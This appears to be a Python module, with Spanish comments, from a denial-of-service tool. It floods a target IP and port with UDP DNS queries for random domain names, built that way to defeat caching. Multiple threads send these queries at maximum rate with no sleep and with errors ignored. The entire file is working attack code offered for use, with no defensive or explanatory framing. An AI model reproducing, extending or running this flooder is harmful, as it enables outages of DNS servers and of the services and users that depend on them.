import socket
import random
import time
import threading

def random_domain(length=12):
    # Genera nombres de dominio aleatorios para evitar caché
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    name = ''.join(random.choice(chars) for _ in range(length))
    tld = random.choice(['com', 'net', 'org', 'xyz', 'info', 'biz'])
    return f"{name}.{tld}"

def build_dns_query(domain):
    transaction_id = random.randbytes(2) if hasattr(random, "randbytes") else bytes([random.randint(0,255), random.randint(0,255)])
    flags = b'\x01\x00'
    questions = b'\x00\x01'
    answer_rrs = b'\x00\x00'
    authority_rrs = b'\x00\x00'
    additional_rrs = b'\x00\x00'
    qname = b''.join(bytes([len(x)]) + x.encode() for x in domain.split('.')) + b'\x00'
    qtype = b'\x00\x01'
    qclass = b'\x00\x01'
    return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + qname + qtype + qclass

def flood_worker(ip, port, duration, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    try:
        while not stop_event.is_set() and time.time() < end_time:
            domain = random_domain(random.randint(10, 30))
            dns_query = build_dns_query(domain)
            try:
                sock.sendto(dns_query, (ip, port))
            except Exception:
                pass  # Ignore send errors to keep flooding
            # No sleep, maximize send rate
    finally:
        sock.close()

def run(ip, port, duration, stop_event, threads=8):
    # Ajusta el número de hilos según tus CPUs (por ejemplo, 4-8 para una VPS de 4 cores)
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood_worker, args=(ip, port, duration, stop_event), daemon=True)
        t.start()
        thread_list.append(t)

    # Espera hasta que termine el tiempo o el stop_event se active
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        time.sleep(0.1)  # Pequeña pausa para no sobrecargar el hilo principal

    # Espera a que todos los hilos terminen
    for t in thread_list:
        t.join(timeout=0.2)
